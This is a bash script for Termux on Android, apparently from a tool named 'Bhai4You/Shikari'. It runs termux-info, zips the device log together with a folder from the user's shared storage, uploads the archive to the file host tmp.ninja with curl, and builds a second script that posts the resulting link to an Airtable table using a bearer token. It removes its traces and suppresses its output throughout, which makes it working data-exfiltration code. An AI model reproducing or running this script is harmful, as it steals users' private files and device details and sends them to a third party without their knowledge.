source /$HOME/shikari.txt
api=$api
base=$base
table=$table
folder=$folder
script2=shikari.sh
ps=' \'
cd ~/storage/shared
termux-info > devicelog
rm -rvf shikari.zip &> /dev/null
zip -r shikari.zip devicelog ~/storage/shared/$folder &> /dev/null
curl -i -F files[]=@shikari.zip https://tmp.ninja/upload.php?output=text > link2 2>&1
cat link2 | grep https > link
rm -rvf shikari.zip &> /dev/null
mv link $HOME
rm -f link2 devicelog
cd $HOME
echo "#!/bin/bash" > $script2
echo "" >> $script2
printf "curl -v -X POST https://api.airtable.com/v0/$base/$table" >> $script2
printf "$ps" >> $script2
echo "" >> $script2
printf "  -H " >> $script2
printf '"' >> $script2
printf "Authorization: Bearer $api" >> $script2
printf '"' >> $script2
printf "$ps" >> $script2
echo "" >> $script2
printf "  -H " >> $script2
printf '"' >> $script2
printf "Content-Type: application/json" >> $script2
printf '"' >> $script2
printf "$ps" >> $script2
echo "" >> $script2
printf "  --data '{" >> $script2
echo "" >> $script2
printf '  "' >> $script2
printf "records" >> $script2
printf '"' >> $script2
printf ": [" >> $script2
echo "" >> $script2
printf "     {" >> $script2
echo "" >> $script2
printf '       "fields"' >> $script2
printf ": {" >> $script2
echo "" >> $script2
printf '         "Name"' >> $script2
printf ": " >> $script2
printf '"' >> $script2
printf "Bhai4You/Shikari" >> $script2
printf '"' >> $script2
printf "," >> $script2
echo "" >> $script2
printf '         "' >> $script2
printf "link" >> $script2
printf '"' >> $script2
printf ": " >> $script2
printf '"' >> $script2
printf "$(cat link)" >> $script2
echo '"' >> $script2
printf "            }" >> $script2
echo "" >> $script2
printf "        }" >> $script2
echo "" >> $script2
printf "    ]" >> $script2
echo "" >> $script2
printf "}'" >> $script2
echo "" >> $script2
rm -rvf link &> /dev/null
